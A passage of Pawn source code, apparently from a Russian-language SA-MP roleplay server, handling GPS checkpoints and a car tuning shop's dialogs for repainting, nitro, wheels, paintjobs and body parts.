					case 3:
					{
						SetPlayerRaceCheckpoint(playerid,1, 2763.7571,-2455.6719,13.5197,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[ПОРТ Los Santos] Место на карте помечено красной меткой");
					} //
					case 4:
					{
						SetPlayerRaceCheckpoint(playerid,1, 308.4211,1406.8721,8.8198,0.0,0.0,0.0,8);
						SendClientMessage(playerid, COLOR_WHITE, "[Нефтезавод] Место на карте помечено красной меткой");
					} //

				}
				SetPVarInt(playerid, "pGPSWork", 1);
			}
			else
			{
				cmd_gps(playerid,inputtext);
				return true;
			}
		}
	case D_CTO+1: // CTO
		{
			if(response)
			{
				new bizzid = GetPVarInt(playerid,"CTObizzid");
				new till = BizzInfo[bizzid][bTill];
				switch(listitem)
				{
				case 0:
					{
						SendMes(playerid,COLOR_WHITE,"Стоимость перекраски: %d$", till*5);
						ShowPlayerDialog(playerid, D_CTO+4, 1, "СТО > Перекраска", "Введите Основной и дополнительный цвет транспорта через запятую", "Перекрасить", "Назад");
					}
				case 1:
					{
						if(GetVehicleComponentInSlot(GetPlayerVehicleID(playerid),CARMODTYPE_HYDRAULICS) != 1087)
						{
							format(string,128,"Стоимость установки: %d$\nВы уверены, что хотите купить и поставить гидравлику?",till*100);
							ShowPlayerDialog(playerid,D_CTO+3,DIALOG_STYLE_MSGBOX,"CTO > Установка гидравлики",string,"Да","Назад");
						}
						else
						{
							ShowPlayerDialog(playerid,D_CTO+3,DIALOG_STYLE_MSGBOX,"CTO > Удаление гидравлики","Вы уверены, что хотите удалить гидравлику?","Да","Назад");
						}
					}
				case 2:
					{
						format(string,128,"[1] Nitro x2\t\t[%d$]\n[2] Nitro x5\t\t[%d$]\n[3] Nitro x10\t\t[%d$]",till*80,till*150,till*300);
						ShowPlayerDialog(playerid,D_CTO+5,DIALOG_STYLE_LIST,"CTO > Закись азота",string,"Купить","Назад");
					}
				case 3:
					{
						format(string,256,"[1] Shadow\t\t[%d$]\n[2] Mega\t\t[%d$]\n[3] Wires\t\t[%d$]\n[4] Classic\t\t[%d$]\n[5] Twist\t\t[%d$]\n[6] Grove\t\t[%d$]\n[7] Atomic\t\t[%d$]\n[8] Dollar [Premium]\t[%d$]",till*60,till*79,till*53,till*73,till*93,till*42,till*100,till*500);
						ShowPlayerDialog(playerid,D_CTO+6,DIALOG_STYLE_LIST,"CTO > Смена дисков",string,"Смотреть","Назад");
					}
				case 4:
					{
						format(string,150,"[1] Покрасочная работа №1\t\t[%d$]\n[2] Покрасочная работа №2\t\t[%d$]\n[3] Покрасочная работа №3\t\t[%d$]",till*30,till*35,till*40);
						ShowPlayerDialog(playerid,D_CTO+7,DIALOG_STYLE_LIST,"CTO > Покрасочные работы",string,"Смотреть","Назад");
					}
				case 5:
					{
						new c = GetPlayerVehicleID(playerid);
						new getmodel = GetVehicleModel(c);
						if(getmodel == 562 || getmodel == 560 || getmodel == 565 || getmodel == 561 || getmodel == 559 || getmodel == 558)
						{
							ShowPlayerDialog(playerid,D_CTO+15,DIALOG_STYLE_LIST,"Спойлера","X-Flow\nAlien","Купить","Отмена");
						}
						else SendClientMessage(playerid,-1,"Данная деталь недоступна для вашей модели"),ShowSTODialog(playerid);
					}
				case 6:
					{
						new c = GetPlayerVehicleID(playerid);
						new getmodel = GetVehicleModel(c);
						if(getmodel == 562 || getmodel == 560 || getmodel == 565 || getmodel == 561 || getmodel == 559 || getmodel == 558  || getmodel == 534  || getmodel == 536  || getmodel == 535  || getmodel == 576)
						{
							ShowPlayerDialog(playerid,D_CTO+16,DIALOG_STYLE_LIST,"Передний бампер","X-Flow\nAlien","Купить","Отмена");
						}
						else SendClientMessage(playerid,-1,"Данная деталь недоступна для вашей модели"),ShowSTODialog(playerid);
					}
				case 7:
					{
						new c = GetPlayerVehicleID(playerid);
						new getmodel = GetVehicleModel(c);
						if(getmodel == 562 || getmodel == 560 || getmodel == 565 || getmodel == 561 || getmodel == 559 || getmodel == 558  || getmodel == 534  || getmodel == 536  || getmodel == 535  || getmodel == 576)
						{
							ShowPlayerDialog(playerid,D_CTO+17,DIALOG_STYLE_LIST,"Задний бампер","X-Flow\nAlien","Купить","Отмена");
						}
						else SendClientMessage(playerid,-1,"Данная деталь недоступна для вашей модели"),ShowSTODialog(playerid);
					}
				case 8:
					{
						new c = GetPlayerVehicleID(playerid);
						new getmodel = GetVehicleModel(c);
						if(getmodel == 562 || getmodel == 560 || getmodel == 565 || getmodel == 561 || getmodel == 559 || getmodel == 558  || getmodel == 534  || getmodel == 536  || getmodel == 535  || getmodel == 575 || getmodel == 576)
						{
							ShowPlayerDialog(playerid,D_CTO+18,DIALOG_STYLE_LIST,"Боковые юбки","X-Flow\nAlien","Купить","Отмена");
						}
						else SendClientMessage(playerid,-1,"Данная деталь недоступна для вашей модели"),ShowSTODialog(playerid);
					}
				case 9:
					{
						new c = GetPlayerVehicleID(playerid);
						new getmodel = GetVehicleModel(c);
						if(getmodel == 562 || getmodel == 560 || getmodel == 565 || getmodel == 561 || getmodel == 559 || getmodel == 558  || getmodel == 534  || getmodel == 536  || getmodel == 535  || getmodel == 575 || getmodel == 576)
						{
							ShowPlayerDialog(playerid,D_CTO+19,DIALOG_STYLE_LIST,"Крыша","X-Flow\nAlien","Купить","Отмена");
						}
						else SendClientMessage(playerid,-1,"Данная деталь недоступна для вашей модели"),ShowSTODialog(playerid);
					}
				}
			}
			else
			{
				new bizzid = GetPVarInt(playerid,"CTObizzid");
				if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Ошибка #261, багоюз!"), KickEx(playerid,12221);
				new pveh = GetPlayerVehicleID(playerid);
				SetVehiclePos(pveh,BizzInfo[bizzid][bEntrx],BizzInfo[bizzid][bEntry],BizzInfo[bizzid][bEntrz]);
				PlayerInfo[ playerid ][ pPos_x ] = BizzInfo[bizzid][bEntrx];
				PlayerInfo[ playerid ][ pPos_y ] = BizzInfo[bizzid][bEntry];
				PlayerInfo[ playerid ][ pPos_z ] = BizzInfo[bizzid][bEntrz];
				TextDrawHideForPlayer(playerid,ButtonLeft);
				DeletePVar(playerid,"UsedCTO");
				TextDrawHideForPlayer(playerid,ButtonRight);
				CancelSelectTextDraw(playerid);
				SetPVarInt(playerid, "AntiBreik", 3);
				SetVehicleZAngle(pveh,270.9845);
				SetVehicleVirtualWorld(pveh,0);
				LinkVehicleToInterior(pveh,0);
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid,0);
				TogglePlayerControllable(playerid,true);
				SetCameraBehindPlayer(playerid);
			}
		}
	case D_CTO+15:
		{
			if(response)
			{
				new i = GetPVarInt(playerid,"CTObizzid");
				new till = BizzInfo[i][bTill];
				new tune[2], c = GetPlayerVehicleID(playerid);
				if(GetVehicleModel(c) == 562) tune[0] = 1146, tune[1] = 1147;
				else if(GetVehicleModel(c) == 560) tune[0] = 1138, tune[1] = 1139;
				else if(GetVehicleModel(c) == 565) tune[0] = 1049, tune[1] = 1050;
				else if(GetVehicleModel(c) == 561) tune[0] = 1058, tune[1] = 1060;
				else if(GetVehicleModel(c) == 559) tune[0] = 1158, tune[1] = 1162;
				else if(GetVehicleModel(c) == 558) tune[0] = 1063, tune[1] = 1064;
				else return SendClientMessage(playerid,-1,"Данная деталь 'Спойлер' недоступна для вашей модели"),ShowSTODialog(playerid);
				AddVehicleComponent(c, tune[listitem]);
				SetPVarInt(playerid,"PriceCTO",till*25);
				SetPVarInt(playerid,"ComponentCTO",tune[listitem]);
				SetPVarInt(playerid,"ProductCTO",25);
				format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*79);
				ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");
			}
			else ShowSTODialog(playerid);
		}
	case D_CTO+16:
		{
			if(response)
			{
				new i = GetPVarInt(playerid,"CTObizzid");
				new till = BizzInfo[i][bTill];
				new tune[2], c = GetPlayerVehicleID(playerid);
				
				
				if(GetVehicleModel(c) == 562) tune[0] = 1171, tune[1] = 1172;
				else if(GetVehicleModel(c) == 560) tune[0] = 1169, tune[1] = 1170;
				else if(GetVehicleModel(c) == 575) tune[0] = 1174, tune[1] = 1175;
				else if(GetVehicleModel(c) == 565) tune[0] = 1152, tune[1] = 1153;
				else if(GetVehicleModel(c) == 561) tune[0] = 1155, tune[1] = 1157;
				else if(GetVehicleModel(c) == 559) tune[0] = 1160, tune[1] = 1173;
				else if(GetVehicleModel(c) == 558) tune[0] = 1165, tune[1] = 1166;
				else if(GetVehicleModel(c) == 534) tune[0] = 1179, tune[1] = 1185;
				else if(GetVehicleModel(c) == 536) tune[0] = 1181, tune[1] = 1182;
				else if(GetVehicleModel(c) == 535) tune[0] = 1188, tune[1] = 1189;
				else if(GetVehicleModel(c) == 576) tune[0] = 1190, tune[1] = 1191;
				else return SendClientMessage(playerid,-1,"Данная деталь 'Передний бампер' недоступна для вашей модели"),ShowSTODialog(playerid);
				AddVehicleComponent(c, tune[listitem]);
				SetPVarInt(playerid,"PriceCTO",till*25);
				SetPVarInt(playerid,"ComponentCTO",tune[listitem]);
				SetPVarInt(playerid,"ProductCTO",25);
				format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*25);
				ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");
			}
			else ShowSTODialog(playerid);
		}
	case D_CTO+17:
		{
			if(response)
			{
				new i = GetPVarInt(playerid,"CTObizzid");
				new till = BizzInfo[i][bTill];
				new tune[2], c = GetPlayerVehicleID(playerid);
				if(GetVehicleModel(c) == 562) tune[0] = 1148, tune[1] = 1149;
				else if(GetVehicleModel(c) == 560) tune[0] = 1140, tune[1] = 1141;
				else if(GetVehicleModel(c) == 575) tune[0] = 1176, tune[1] = 1177;
				else if(GetVehicleModel(c) == 565) tune[0] = 1150, tune[1] = 1151;
				else if(GetVehicleModel(c) == 561) tune[0] = 1154, tune[1] = 1156;
				else if(GetVehicleModel(c) == 559) tune[0] = 1159, tune[1] = 1161;
				else if(GetVehicleModel(c) == 558) tune[0] = 1167, tune[1] = 1168;
				else if(GetVehicleModel(c) == 534) tune[0] = 1178, tune[1] = 1180;
				else if(GetVehicleModel(c) == 536) tune[0] = 1183, tune[1] = 1184;
				else if(GetVehicleModel(c) == 535) tune[0] = 1186, tune[1] = 1187;
				else if(GetVehicleModel(c) == 576) tune[0] = 1192, tune[1] = 1193;
				else return SendClientMessage(playerid,-1,"Данная деталь 'Задний бампер' недоступна для вашей модели"),ShowSTODialog(playerid);
				AddVehicleComponent(c, tune[listitem]);
				SetPVarInt(playerid,"PriceCTO",till*25);
				SetPVarInt(playerid,"ComponentCTO",tune[listitem]);
				SetPVarInt(playerid,"ProductCTO",25);
				format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*79);
				ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");
			}
			else ShowSTODialog(playerid);
		}
	case D_CTO+18:
		{
			if(response)
			{
				new i = GetPVarInt(playerid,"CTObizzid");
				new till = BizzInfo[i][bTill];
				new tune[4], c = GetPlayerVehicleID(playerid);
				if(GetVehicleModel(c) == 562) tune[0] = 1041, tune[1] = 1036, tune[2] = 1039, tune[3] = 1040;
				else if(GetVehicleModel(c) == 560) tune[0] = 1031, tune[1] = 1026, tune[2] = 1030, tune[3] = 1027;
				else if(GetVehicleModel(c) == 575) { SendClientMessage(playerid, COLOR_GREY, "Невозможно прикрепить боковые юбки к данному транспорту!"); return ShowSTODialog(playerid); }
				else if(GetVehicleModel(c) == 565) tune[0] = 1048, tune[1] = 1047, tune[2] = 1039, tune[3] = 1040;
				else if(GetVehicleModel(c) == 561) tune[0] = 1057, tune[1] = 1056, tune[2] = 1063, tune[3] = 1062;
				else if(GetVehicleModel(c) == 559) tune[0] = 1070, tune[1] = 1069, tune[2] = 1072, tune[3] = 1071;
				else if(GetVehicleModel(c) == 558) tune[0] = 1095, tune[1] = 1090, tune[2] = 1093, tune[3] = 1194;
				else if(GetVehicleModel(c) == 534) tune[0] = 1106, tune[1] = 1101, tune[2] = 1124, tune[3] = 1122;
				else if(GetVehicleModel(c) == 536) tune[0] = 1108, tune[1] = 1107, tune[2] = 1108, tune[3] = 1107;
				else if(GetVehicleModel(c) == 535) tune[0] = 1119, tune[1] = 1121, tune[2] = 1121, tune[3] = 1120;
				else if(GetVehicleModel(c) == 576) tune[0] = 1134, tune[1] = 1137, tune[2] = 1134, tune[3] = 1137;
				else return SendClientMessage(playerid,-1,"Данная деталь 'Боковые Юбки' недоступна для вашей модели"),ShowSTODialog(playerid);
				AddVehicleComponent(c, tune[listitem]);
				//AddVehicleComponent(c, tune[listitem+2]);
				SetPVarInt(playerid,"PriceCTO",till*25);
				SetPVarInt(playerid,"ComponentCTO",tune[listitem]);
				SetPVarInt(playerid,"ComponentCTO2", tune[listitem+2]);
				SetPVarInt(playerid,"ProductCTO",25);
				format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*79);
				ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");
			}
			else ShowSTODialog(playerid);
		}
	case D_CTO+19:
		{
			if(response)
			{
				new i = GetPVarInt(playerid,"CTObizzid");
				new till = BizzInfo[i][bTill];
				new tune[2], c = GetPlayerVehicleID(playerid);
				if(GetVehicleModel(c) == 562) tune[0] = 1035, tune[1] = 1038;
				else if(GetVehicleModel(c) == 560) tune[0] = 1032, tune[1] = 1033;
				else if(GetVehicleModel(c) == 575) { SendClientMessage(playerid, COLOR_GREY, "Невозможно прикрепить крышу к данному транспорту!"); return ShowSTODialog(playerid); }
				else if(GetVehicleModel(c) == 565) tune[0] = 1053, tune[1] = 1054;
				else if(GetVehicleModel(c) == 561) tune[0] = 1055, tune[1] = 1061;
				else if(GetVehicleModel(c) == 559) tune[0] = 1067, tune[1] = 1068;
				else if(GetVehicleModel(c) == 558) tune[0] = 1088, tune[1] = 1091;
				else if(GetVehicleModel(c) == 534) { SendClientMessage(playerid, COLOR_GREY, "Невозможно прикрепить крышу к данному транспорту!"); return ShowSTODialog(playerid); }
				else if(GetVehicleModel(c) == 536) tune[0] = 1103, tune[1] = 1128;
				else if(GetVehicleModel(c) == 535) tune[0] = 1130, tune[1] = 1131;
				else if(GetVehicleModel(c) == 576) { SendClientMessage(playerid, COLOR_GREY, "Невозможно прикрепить крышу к данному транспорту!"); return ShowSTODialog(playerid); }
				else
				{
					ShowSTODialog(playerid);
					return SendClientMessage(playerid,-1,"Данная деталь 'Крыша' недоступна для вашей модели");
				}
				AddVehicleComponent(c, tune[listitem]);
				SetPVarInt(playerid,"PriceCTO",till*25);
				SetPVarInt(playerid,"ComponentCTO",tune[listitem]);
				SetPVarInt(playerid,"ProductCTO",25);
				format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*79);
				ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");
			}
			else ShowSTODialog(playerid);
		}
	case D_CTO+3: // CTO
		{
			if(response)
			{
				new i = GetPVarInt(playerid,"CTObizzid");
				new till = BizzInfo[i][bTill];
				if(GetVehicleComponentInSlot(GetPlayerVehicleID(playerid),CARMODTYPE_HYDRAULICS) != 1087)
				{
					if(GetMoney(playerid) < till*100) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
					GiveMoney(playerid, -till*100);
					BizzInfo[i][bMoney] += till*100;
					BizzInfo[i][bProduct] -= 100;
					BizzPay[i] += till*100;
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					SendClientMessage(playerid,COLOR_WHITE,"Вы поставили гидравлику!");
					AddVehicleComponent(GetPlayerVehicleID(playerid),1087);
					SaveVehicleTuning(playerid);
					ShowSTODialog(playerid);
				}
				else
				{
					SendClientMessage(playerid,COLOR_WHITE,"Вы удалили гидравлику!");
					RemoveVehicleComponent(GetPlayerVehicleID(playerid),1087);
					SaveVehicleTuning(playerid);
					ShowSTODialog(playerid);
				}
			}
			ShowSTODialog(playerid);
		}
	case D_CTO+4: // CTO цвета 1
		{
			if(response)
			{
				new color[2], c = GetPVarInt(playerid, "PlayerCar");
				if(sscanf(inputtext, "p<,>ii",color[0], color[1])) return ShowPlayerDialog(playerid, D_CTO+4, 1, "СТО > Перекраска", "Введите Основной и дополнительный цвет транспорта через запятую", "Принять", "Назад");
				if(color[0] < 0 || color[0] > 252)
				{
					ShowPlayerDialog(playerid, D_CTO+4, 1, "СТО > Перекраска", "Введите Основной и дополнительный цвет транспорта через запятую", "Принять", "Назад");
					return SendClientMessage(playerid, COLOR_GREY, "ID цвета от 0 до 252!");
				}
				if(color[1] < 0 || color[1] > 252)
				{
					ShowPlayerDialog(playerid, D_CTO+4, 1, "СТО > Перекраска", "Введите Основной и дополнительный цвет транспорта через запятую", "Принять", "Назад");
					return SendClientMessage(playerid, COLOR_GREY, "ID цвета от 0 до 252!");
				}
				new i = GetPVarInt(playerid,"CTObizzid");
				new till = BizzInfo[i][bTill];
				if(GetMoney(playerid) < till*5) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
				GiveMoney(playerid, -till*5);
				BizzInfo[i][bMoney] += till*5;
				BizzInfo[i][bProduct] -= 5;
				BizzPay[i] += till*5;
				SetBizzInt(i, "money", BizzInfo[i][bMoney]);
				SetBizzInt(i, "product", BizzInfo[i][bProduct]);
				SaveVehicleColor(playerid, color[0], color[1]);
				ChangeVehicleColor(c, color[0], color[1]);
				SendClientMessage(playerid,COLOR_WHITE,"Вы успешно перекрасили свое авто!");
			}
			ShowSTODialog(playerid);
		}
	case D_CTO+5: // CTO
		{
			if(response)
			{
				new i = GetPVarInt(playerid,"CTObizzid");
				new till = BizzInfo[i][bTill];
				switch(listitem)
				{
				case 0:
					{
						if(GetMoney(playerid) < till*80) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						GiveMoney(playerid, -till*80);
						BizzInfo[i][bMoney] += till*80;
						BizzInfo[i][bProduct] -= 80;
						BizzPay[i] += till*80;
						SetBizzInt(i, "money", BizzInfo[i][bMoney]);
						SetBizzInt(i, "product", BizzInfo[i][bProduct]);
						SendMes(playerid,COLOR_WHITE,"Вы поставили Nitro x2 за %d$", till*80);
						AddVehicleComponent(GetPlayerVehicleID(playerid),1009);
						SaveVehicleTuning(playerid);
					}
				case 1:
					{
						if(GetMoney(playerid) < till*150) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						GiveMoney(playerid, -till*150);
						BizzInfo[i][bMoney] += till*150;
						BizzInfo[i][bProduct] -= 150;
						BizzPay[i] += till*150;
						SetBizzInt(i, "money", BizzInfo[i][bMoney]);
						SetBizzInt(i, "product", BizzInfo[i][bProduct]);
						SendMes(playerid,COLOR_WHITE,"Вы поставили Nitro x5 за %d$", till*150);
						AddVehicleComponent(GetPlayerVehicleID(playerid),1008);
						SaveVehicleTuning(playerid);
					}
				case 2:
					{
						if(GetMoney(playerid) < till*300) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						GiveMoney(playerid, -till*300);
						BizzInfo[i][bMoney] += till*300;
						BizzInfo[i][bProduct] -= 300;
						BizzPay[i] += till*300;
						SetBizzInt(i, "money", BizzInfo[i][bMoney]);
						SetBizzInt(i, "product", BizzInfo[i][bProduct]);
						SendMes(playerid,COLOR_WHITE,"Вы поставили Nitro x10 за %d$", till*300);
						AddVehicleComponent(GetPlayerVehicleID(playerid),1010);
						SaveVehicleTuning(playerid);
					}
				}
			}
			ShowSTODialog(playerid);
		}
	case D_CTO+6: // CTO
		{
			if(response)
			{
				new i = GetPVarInt(playerid,"CTObizzid");
				new till = BizzInfo[i][bTill];
				switch(listitem)
				{
				case 0:
					{
						if(GetMoney(playerid) < till*60) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						SendMes(playerid,COLOR_WHITE,"Вы поставили диски Shadow, их стоимость %d$", till*60);
						AddVehicleComponent(GetPlayerVehicleID(playerid),1073);
						SetPVarInt(playerid,"PriceCTO",till*60);
						SetPVarInt(playerid,"ComponentCTO",1073);
						SetPVarInt(playerid,"ProductCTO",60);
						format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*60);
						ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");


					}
				case 1:
					{
						if(GetMoney(playerid) < till*79) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						SendMes(playerid,COLOR_WHITE,"Вы поставили диски Mega, их стоимость %d$", till*79);
						AddVehicleComponent(GetPlayerVehicleID(playerid),1074);
						SetPVarInt(playerid,"PriceCTO",till*79);
						SetPVarInt(playerid,"ComponentCTO",1074);
						SetPVarInt(playerid,"ProductCTO",79);
						format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*79);
						ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");
					}
				case 2:
					{
						if(GetMoney(playerid) < till*53) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						SendMes(playerid,COLOR_WHITE,"Вы поставили диски Wires, их стоимость %d$", till*53);
						AddVehicleComponent(GetPlayerVehicleID(playerid),1076);
						SetPVarInt(playerid,"PriceCTO",till*53);
						SetPVarInt(playerid,"ComponentCTO",1076);
						SetPVarInt(playerid,"ProductCTO",53);
						format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*53);
						ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");

					}
				case 3:
					{
						if(GetMoney(playerid) < till*73) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						SendMes(playerid,COLOR_WHITE,"Вы поставили диски Classic, их стоимость %d$", till*73);
						AddVehicleComponent(GetPlayerVehicleID(playerid),1077);
						SetPVarInt(playerid,"PriceCTO",till*73);
						SetPVarInt(playerid,"ComponentCTO",1077);
						SetPVarInt(playerid,"ProductCTO",73);
						format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*73);
						ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");

					}
				case 4:
					{
						if(GetMoney(playerid) < till*93) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						SendMes(playerid,COLOR_WHITE,"Вы поставили диски Twist, их стоимость %d$", till*93);
						AddVehicleComponent(GetPlayerVehicleID(playerid),1078);
						SetPVarInt(playerid,"PriceCTO",till*93);
						SetPVarInt(playerid,"ComponentCTO",1078);
						SetPVarInt(playerid,"ProductCTO",93);
						format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*93);
						ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");

					}
				case 5:
					{
						if(GetMoney(playerid) < till*42) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						SendMes(playerid,COLOR_WHITE,"Вы поставили диски Grove, их стоимость %d$", till*42);
						AddVehicleComponent(GetPlayerVehicleID(playerid),1081);
						SetPVarInt(playerid,"PriceCTO",till*42);
						SetPVarInt(playerid,"ComponentCTO",1081);
						SetPVarInt(playerid,"ProductCTO",42);
						format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*42);
						ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");

					}
				case 6:
					{
						if(GetMoney(playerid) < till*100) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						SendMes(playerid,COLOR_WHITE,"Вы поставили диски Atomic, их стоимость %d$", till*100);
						AddVehicleComponent(GetPlayerVehicleID(playerid),1085);
						SetPVarInt(playerid,"PriceCTO",till*100);
						SetPVarInt(playerid,"ComponentCTO",1085);
						SetPVarInt(playerid,"ProductCTO",100);
						format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*100);
						ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");
					}
				case 7:
					{
						if(GetMoney(playerid) < till*500) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						if(PlayerInfo[playerid][pVIP] == false) return SendClientMessage(playerid, COLOR_GREY, "Для покупки этих колес требуется Premium аккаунт ("Namesite")!"), ShowSTODialog(playerid);
						SendMes(playerid,COLOR_WHITE,"Вы поставили диски Dollar for Premium, их стоимость %d$", till*500);
						AddVehicleComponent(GetPlayerVehicleID(playerid),1083);
						SetPVarInt(playerid,"PriceCTO",till*500);
						SetPVarInt(playerid,"ComponentCTO",1083);
						SetPVarInt(playerid,"ProductCTO",500);
						format(string,128,"Стоимость этой запчасти: %d\nВы надумали с покупкой?",till*500);
						ShowPlayerDialog(playerid,D_CTO+12,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");
						//SaveVehicleTuning(playerid);
					}
				}
			}
			else ShowSTODialog(playerid);
		}
	case D_CTO+13:
		{
			new i = GetPVarInt(playerid,"CTObizzid");
			if(response)
			{
				GiveMoney(playerid, -GetPVarInt(playerid,"PriceCTO"));
				BizzInfo[i][bMoney] += GetPVarInt(playerid,"PriceCTO");
				BizzInfo[i][bProduct] -= GetPVarInt(playerid,"ProductCTO");
				BizzPay[i] += GetPVarInt(playerid,"PriceCTO");
				SetBizzInt(i, "money", BizzInfo[i][bMoney]);
				SetBizzInt(i, "product", BizzInfo[i][bProduct]);
				SendMes(playerid,COLOR_WHITE,"Вы оплатили %d$ за покрасочную работу", GetPVarInt(playerid,"PriceCTO"));
				PlayerInfo[playerid][cPaintjob] = GetPVarInt(playerid,"PaintjobCTO");
				ShowSTODialog(playerid);
			}
			else
			{
				if(PlayerInfo[playerid][cPaintjob]!=3)
				{
					ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),PlayerInfo[playerid][cPaintjob]);
					SendClientMessage(playerid,COLOR_WHITE,"Вы отменили покупку");
					ShowSTODialog(playerid);
				}
				else
				{
					ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),3);
					ChangeVehicleColor(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cColor][0], PlayerInfo[playerid][cColor][1]);
					SendClientMessage(playerid,COLOR_WHITE,"Вы отменили покупку");
					ShowSTODialog(playerid);
				}
			}
		}
	case D_CTO+7: // CTO
		{
			if(response)
			{
				new i = GetPVarInt(playerid,"CTObizzid");
				new till = BizzInfo[i][bTill];
				switch(listitem)
				{
				case 0:
					{
						if(GetMoney(playerid) < till*30) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),0);
						SetPVarInt(playerid,"PriceCTO",till*30);
						SetPVarInt(playerid,"PaintjobCTO",0);
						SetPVarInt(playerid,"ProductCTO",30);
						format(string,128,"Стоимость этой покрасочной работы: %d\nВы надумали с покупкой?",till*30);
						ShowPlayerDialog(playerid,D_CTO+13,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");

					}
				case 1:
					{
						if(GetMoney(playerid) < till*35) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),1);
						SetPVarInt(playerid,"PriceCTO",till*35);
						SetPVarInt(playerid,"PaintjobCTO",1);
						SetPVarInt(playerid,"ProductCTO",35);
						format(string,128,"Стоимость этой покрасочной работы: %d\nВы надумали с покупкой?",till*35);
						ShowPlayerDialog(playerid,D_CTO+13,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");
					}
				case 2:
					{
						if(GetMoney(playerid) < till*40) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"),ShowSTODialog(playerid);
						ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),2);
						SetPVarInt(playerid,"PriceCTO",till*40);
						SetPVarInt(playerid,"PaintjobCTO",2);
						SetPVarInt(playerid,"ProductCTO",40);
						format(string,128,"Стоимость этой покрасочной работы: %d\nВы надумали с покупкой?",till*40);
						ShowPlayerDialog(playerid,D_CTO+13,DIALOG_STYLE_MSGBOX,"Подтверждение покупки",string,"Купить","Отмена");
					}
				case 3:
					{
						ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),3);
						ShowSTODialog(playerid);
						SendClientMessage(playerid,COLOR_WHITE,"Вы удалили покрасочную работу на авто");}
				}
			}
			else ShowSTODialog(playerid);
		}
	case D_CTO+12: // CTO
		{
			new i = GetPVarInt(playerid,"CTObizzid");
			//			new till = BizzInfo[i][bTill];
			if(response)
			{
				GiveMoney(playerid, -GetPVarInt(playerid,"PriceCTO"));
				BizzInfo[i][bMoney] += GetPVarInt(playerid,"PriceCTO");
				BizzInfo[i][bProduct] -= GetPVarInt(playerid,"ProductCTO");
				BizzPay[i] += GetPVarInt(playerid,"PriceCTO");
				SetBizzInt(i, "money", BizzInfo[i][bMoney]);
